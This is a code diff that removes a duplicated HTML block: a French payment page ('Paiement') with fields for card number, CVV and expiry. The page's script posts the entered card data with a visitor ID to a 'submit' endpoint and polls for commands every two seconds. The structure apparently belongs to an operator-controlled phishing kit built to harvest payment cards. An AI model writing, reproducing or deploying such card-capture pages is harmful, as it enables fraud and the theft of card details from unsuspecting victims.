@@ -23,22 +23,3 @@ setInterval(()=>fetchCommand(visitorId),2000);
 </body>
 </html>
 
-<body data-visitor-id="">
-<h1>Paiement</h1>
-<form id="paymentForm">
-  <input name="card" placeholder="Numéro carte" required>
-  <input name="cvv" placeholder="CVV" required>
-  <input name="expiry" placeholder="MM/AA" required>
-  <button type="submit">Suivant</button>
-</form>
-<script>
-const visitorId=document.body.dataset.visitorId;
-document.getElementById('paymentForm').onsubmit=e=>{
-  e.preventDefault();
-  const data={card:e.target.card.value,cvv:e.target.cvv.value,expiry:e.target.expiry.value};
-  fetch('submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visitorId,type:'payment',data})});
-};
-setInterval(()=>fetchCommand(visitorId),2000);
-</script>
-</body>
-</html>
